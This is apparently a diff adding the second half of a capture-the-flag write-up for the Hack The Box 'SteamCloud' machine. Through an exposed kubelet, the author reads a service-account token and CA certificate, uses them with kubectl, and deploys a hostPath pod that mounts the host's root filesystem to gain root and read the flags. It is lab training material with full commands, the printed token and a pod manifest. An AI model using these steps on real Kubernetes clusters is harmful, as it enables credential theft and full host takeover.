@@ -236,15 +236,162 @@ tmp
 usr
 var
 ```
-nice nice, lets try to spawn a reverse shell with this
+nice nice, now that we have rce, I tried to get a reverse shell, it didn't work. I even tried to read the root flag, it didn't work.  I think the commands we are allowed to run here is limited
 
-command:```
+Doing a little research,
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0a75941f-cc2d-4dc6-b36d-e977157e6bf8)
 
+We can see that the token and certificate is stored in the directory ```/var/run/secrets/kubernetes.io/serviceaccount```. Now, we can try to read the token
 
+command:```./kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --namespace default --pod nginx --container nginx --server 10.129.96.167```
 
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ ./kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --namespace default --pod nginx --container nginx --server 10.129.96.167
+eyJhbGciOiJSUzI1NiIsImtpZCI6Im9Qa2h1RmJVRXEyM1NyVGFqYWVSN21sVndFT2tvVGRyRW5qOFIwcDN1Nm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwNDY1NDI5LCJpYXQiOjE2OTg5Mjk0MjksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImMwMDg5MDQzLWY2ZWMtNGUwOC1iMzA1LWE5NzBhYjViNDZmNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjZGIyMDFhLWJhZGEtNGRhZS1iODViLTcwNTMwNTNkMGFjOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTg5MzMwMzZ9LCJuYmYiOjE2OTg5Mjk0MjksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.iD84RH95cDB7UfY9j7IxxgGgMsoICVR_T-ouWzNFtXl1S3giDScbBTytdNOixrLLcn9EW-_dceO3HdldEbjd4R1NlFO_GP0QX41gS176Egaj5ZmZmdvnlRnKwAxt5ffAQiFUw049eBFPU3fsRuN0NRFd523YMFhaWYrbVYeSoYILkaZKMW60GQrsnBYEj_swy0NYxgfz_mLFbGZvJxK7nCQGKdImOkEOWTfL3lIPOURkTzRouRjroLxZf0EuIsMaho3F15SMCcCEzu-_FhB25XQZLqK8aP7wbnfvb4xijmNCgY7dMLb6jnY98jL7kD3Jn17IfvttsL9AiQzlvgiM0A
+```
+nice nice, lets grab the certificate also
 
+command:```./kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" --namespace default --pod nginx --container nginx --server 10.129.96.167```
 
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ ./kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" --namespace default --pod nginx --container nginx --server 10.129.96.167 
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+```
+With this we should be able to perform higher privleged operations.
+
+Lets login with this
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ kubectl --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Im9Qa2h1RmJVRXEyM1NyVGFqYWVSN21sVndFT2tvVGRyRW5qOFIwcDN1Nm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwNDY1NDI5LCJpYXQiOjE2OTg5Mjk0MjksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImMwMDg5MDQzLWY2ZWMtNGUwOC1iMzA1LWE5NzBhYjViNDZmNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjZGIyMDFhLWJhZGEtNGRhZS1iODViLTcwNTMwNTNkMGFjOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTg5MzMwMzZ9LCJuYmYiOjE2OTg5Mjk0MjksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.iD84RH95cDB7UfY9j7IxxgGgMsoICVR_T-ouWzNFtXl1S3giDScbBTytdNOixrLLcn9EW-_dceO3HdldEbjd4R1NlFO_GP0QX41gS176Egaj5ZmZmdvnlRnKwAxt5ffAQiFUw049eBFPU3fsRuN0NRFd523YMFhaWYrbVYeSoYILkaZKMW60GQrsnBYEj_swy0NYxgfz_mLFbGZvJxK7nCQGKdImOkEOWTfL3lIPOURkTzRouRjroLxZf0EuIsMaho3F15SMCcCEzu-_FhB25XQZLqK8aP7wbnfvb4xijmNCgY7dMLb6jnY98jL7kD3Jn17IfvttsL9AiQzlvgiM0A" --certificate-authority=ca.crt --server=https://10.129.96.167:8443 get pods
+NAME    READY   STATUS    RESTARTS   AGE
+nginx   1/1     Running   0          175m
+```
+We can check the privileges we have on this default service account
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ kubectl --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Im9Qa2h1RmJVRXEyM1NyVGFqYWVSN21sVndFT2tvVGRyRW5qOFIwcDN1Nm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwNDY1NDI5LCJpYXQiOjE2OTg5Mjk0MjksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImMwMDg5MDQzLWY2ZWMtNGUwOC1iMzA1LWE5NzBhYjViNDZmNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjZGIyMDFhLWJhZGEtNGRhZS1iODViLTcwNTMwNTNkMGFjOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTg5MzMwMzZ9LCJuYmYiOjE2OTg5Mjk0MjksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.iD84RH95cDB7UfY9j7IxxgGgMsoICVR_T-ouWzNFtXl1S3giDScbBTytdNOixrLLcn9EW-_dceO3HdldEbjd4R1NlFO_GP0QX41gS176Egaj5ZmZmdvnlRnKwAxt5ffAQiFUw049eBFPU3fsRuN0NRFd523YMFhaWYrbVYeSoYILkaZKMW60GQrsnBYEj_swy0NYxgfz_mLFbGZvJxK7nCQGKdImOkEOWTfL3lIPOURkTzRouRjroLxZf0EuIsMaho3F15SMCcCEzu-_FhB25XQZLqK8aP7wbnfvb4xijmNCgY7dMLb6jnY98jL7kD3Jn17IfvttsL9AiQzlvgiM0A" --certificate-authority=ca.crt --server=https://10.129.96.167:8443 auth can-i --list
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+```
+it seems we can create a pod in the default namespace 
+
+Lets create our pod
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: bankai
+  namespace: default
+spec:
+  containers:
+  - name: bankai
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: rooty
+  volumes:
+  - name: rooty
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+This YAML configuration defines a Kubernetes Pod named "bankai". Save this in a file say ```shikai.yml```
+
+Now lets add this
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ kubectl --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Im9Qa2h1RmJVRXEyM1NyVGFqYWVSN21sVndFT2tvVGRyRW5qOFIwcDN1Nm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwNDY1NDI5LCJpYXQiOjE2OTg5Mjk0MjksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImMwMDg5MDQzLWY2ZWMtNGUwOC1iMzA1LWE5NzBhYjViNDZmNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjZGIyMDFhLWJhZGEtNGRhZS1iODViLTcwNTMwNTNkMGFjOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTg5MzMwMzZ9LCJuYmYiOjE2OTg5Mjk0MjksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.iD84RH95cDB7UfY9j7IxxgGgMsoICVR_T-ouWzNFtXl1S3giDScbBTytdNOixrLLcn9EW-_dceO3HdldEbjd4R1NlFO_GP0QX41gS176Egaj5ZmZmdvnlRnKwAxt5ffAQiFUw049eBFPU3fsRuN0NRFd523YMFhaWYrbVYeSoYILkaZKMW60GQrsnBYEj_swy0NYxgfz_mLFbGZvJxK7nCQGKdImOkEOWTfL3lIPOURkTzRouRjroLxZf0EuIsMaho3F15SMCcCEzu-_FhB25XQZLqK8aP7wbnfvb4xijmNCgY7dMLb6jnY98jL7kD3Jn17IfvttsL9AiQzlvgiM0A" --certificate-authority=ca.crt --server=https://10.129.96.167:8443 apply -f shikai.yaml 
+pod/bankai created
+```
+nice nice,
+
+Lets get pods again
+
+```
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ kubectl --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Im9Qa2h1RmJVRXEyM1NyVGFqYWVSN21sVndFT2tvVGRyRW5qOFIwcDN1Nm8ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwNDY1NDI5LCJpYXQiOjE2OTg5Mjk0MjksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImMwMDg5MDQzLWY2ZWMtNGUwOC1iMzA1LWE5NzBhYjViNDZmNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjZGIyMDFhLWJhZGEtNGRhZS1iODViLTcwNTMwNTNkMGFjOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTg5MzMwMzZ9LCJuYmYiOjE2OTg5Mjk0MjksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.iD84RH95cDB7UfY9j7IxxgGgMsoICVR_T-ouWzNFtXl1S3giDScbBTytdNOixrLLcn9EW-_dceO3HdldEbjd4R1NlFO_GP0QX41gS176Egaj5ZmZmdvnlRnKwAxt5ffAQiFUw049eBFPU3fsRuN0NRFd523YMFhaWYrbVYeSoYILkaZKMW60GQrsnBYEj_swy0NYxgfz_mLFbGZvJxK7nCQGKdImOkEOWTfL3lIPOURkTzRouRjroLxZf0EuIsMaho3F15SMCcCEzu-_FhB25XQZLqK8aP7wbnfvb4xijmNCgY7dMLb6jnY98jL7kD3Jn17IfvttsL9AiQzlvgiM0A" --certificate-authority=ca.crt --server=https://10.129.96.167:8443 get pods         
+NAME     READY   STATUS    RESTARTS   AGE
+bankai   1/1     Running   0          59s
+nginx    1/1     Running   0          3h5m
+```
+We have the pod ```bankai``` running.
+
+Now lets try to execute rce with this pod
+
+command:```./kubeletctl exec "id" --pod bankai --container bankai --server 10.129.96.167```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ ./kubeletctl exec "id" --pod bankai --container bankai --server 10.129.96.167 
+uid=0(root) gid=0(root) groups=0(root)
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/steamcloud]
+└─$ ./kubeletctl exec "ls /" --pod bankai --container bankai --server 10.129.96.167
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+```
+We can spawn a reverse shell using the command below
+
+command:```./kubeletctl exec "/bin/bash" --pod bankai --container bankai --server 10.129.96.167```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c84972ed-f41b-449f-a608-bc4a852bd998)
+
+The ```user.txt``` file is located in the directory ```/root/home/user.txt``` while the ```root.txt``` file is located in the directory ```/root/root/root.txt```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4557428a-0fc1-48bb-b21c-9494611f942d)
+
+We have successfully pwned this box
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
